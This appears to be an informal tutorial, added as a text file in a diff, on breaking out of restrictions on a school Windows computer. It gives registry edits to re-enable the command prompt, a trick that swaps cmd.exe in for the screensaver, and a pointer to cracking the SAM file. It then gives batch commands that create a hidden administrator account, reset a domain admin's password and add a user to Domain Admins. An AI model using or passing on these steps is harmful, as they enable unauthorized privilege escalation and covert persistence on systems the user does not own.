@@ -1,0 +1,79 @@
+Your first step is to try and get access to DOS. You can start by clicking
+
+"start>all programs>accessories>cmd" or "start>run> type in 'cmd'"
+
+If neither of those work, create a new text document. Name it "anything.bat"
+right click on it and click edit. Type "cmd" save and close it. Open it. If you see a black box and are able to type, you now have dos.
+
+If that didn't work, instead of typing "cmd", type
+
+@echo off
+echo hello
+pause
+
+Open it, if you see "hello", create a new text document and name it "anything.reg", right click and edit.
+
+REGEDIT4
+[HKEY_CURRENT_USERSoftwareMicrosoftWindowsCurrentVersionPoliciesWinOldApp]
+"Disabled"=dword:0
+[HKEY_CURRENT_USERSoftwareMicrosoftWindowsCurrentVersionPoliciesSystem]
+"DisableRegistryTools"=dword:0
+
+This changes the registry value that blocks dos. So, type "cmd" in the .bat and see if it works. If that also didn't work, theres still other ways.
+
+If it didn't work because for whatever reason, you can't create a .bat, open up microsoft word, which I'm sure all schools have.
+Now, type in your commands and click "file>save as>" for the type, put "text document, and save as "anything.bat".
+If that wasn't the reason, I hope you have access to the C drive.
+If you do, go here "C:\Windows\system32\" and create a new folder.
+Now, find "cmd.exe" and "scrnsave.scr" and copy them to the new folder.
+Goto the folder and rename "scrnsave.scr" to "scrnsaveold.scr", and "cmd.exe" to "scrnsave.scr" And replace it with the real one in system32. Now the next time your screen saver appears, it will be full access dos. So, if you can, on the desktop, right click and select properties. Change the time to one minute. On windows xp, you may have to make sure the screensaver is "scrnsave".
+
+If that didn't work, you can try the control panel, I'm not sure if you will be able to unblock dos from there or not, but you can try. If access to the control panel is disabled. Create a new folder and name it one of these. (only the {....} part)
+
+Printers: {2227A280-3AEA-1069-A2DE-08002B30309D}
+Control panel: {305CA226-D286-468e-B848-2B2E8E697B74}
+Dial-up networking: {992CFFA0-F557-101A-88EC-00DD010CCC48}
+Scheduled tasks: {D6277990-4C6A-11CF-8D87-00AA0060F5BF}
+Folder options: {6DFD7C5C-2451-11d3-A299-00C04F8EF6AF}
+Dial-Up Networking: {992CFFA0-F557-101A-88EC-00DD010CCC48}
+Scheduled tasks: {D6277990-4C6A-11CF-8D87-00AA0060F5BF}
+Taskbar and startmenu: {0DF44EAA-FF21-4412-828E-260A8728E7F1}
+Microsoft FTP folder {63da6ec0-2e98-11cf-8d82-444553540000}
+Temporary Internet files {7BD29E00-76C1-11CF-9DD0-00A0C9034933}
+ActiveX Cache folder {88C6C381-2E85-11D0-94DE-444553540000
+Subscblockedriptions folder {F5175861-2688-11d0-9C5E-00AA00A45957}
+History {FF393560-C2A7-11CF-BFF4-444553540000}
+
+
+Another way to get dos, is to create a prog. Uber0n has created such a program. You can find it at http://www.freewebs.com/uber0n/ You'll need a c++ compiler.
+
+If so far, nothing has worked. You need to crack the sam file. Pretty sure Cain & Abel has this option.
+
+If you did get dos, it's time to create yourself an admin acct. Type this.
+
+@echo off
+net user winsys password /add
+net localgroup administrators winsys /add
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v winsys/t REG_DWORD /d 0
+
+First Line just hides the file address and stuff.
+Second Line Creates the user "winsys" with the password of "password".
+Third Line adds "winsys" to the administrators group.
+Fourth Line makes the acct "winsys" a hidden acct.
+If you see "The command completed successfully." or something similiar, congragulations. You now have root. If it didn't work, it means you have limited access dos, use the screensaver thing.
+
+If you want domain root, you can either find the domain admin's username and type
+
+@echo off
+net user [username] [newpassword]
+
+That will change his/her pass.
+Or, if you can get on his/her comp, type this in dos.
+
+net group "Domain Admins" [username] /add
+
+This will add an acct to the domain admins.
+
+Also, if you don't have access to the C drive, or any other drive, theres a few ways to view it's contents. You just need to be able to install programs.
+Google has a program called "Google Desktop" which indexes the computer and makes it searchable. Or, you can download a web browser such as Opera.
+In the url bar type this "file://" you should now see a list of drives. Enjoy.
